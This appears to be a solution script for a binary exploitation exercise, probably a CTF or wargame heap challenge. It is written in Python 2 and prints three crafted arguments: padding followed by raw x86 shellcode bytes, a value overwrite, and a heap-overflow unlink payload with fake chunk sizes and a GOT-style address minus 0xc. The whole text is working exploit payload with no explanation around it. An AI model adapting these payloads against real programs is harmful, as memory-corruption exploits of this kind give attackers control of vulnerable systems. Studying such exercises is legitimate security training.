#first argv
print "A" * 8 + "\xB8\x64\x88\x04\x08\xFF\xD0"

#second argv
import struct
print "B" * 36 + struct.pack("I", 0x65)

#third argv
import struct
print "C" * 92 + struct.pack("I", 0xfffffffc) * 2 + struct.pack("I", 0x804b128-0xc) + struct.pack("I", 0x804c010)
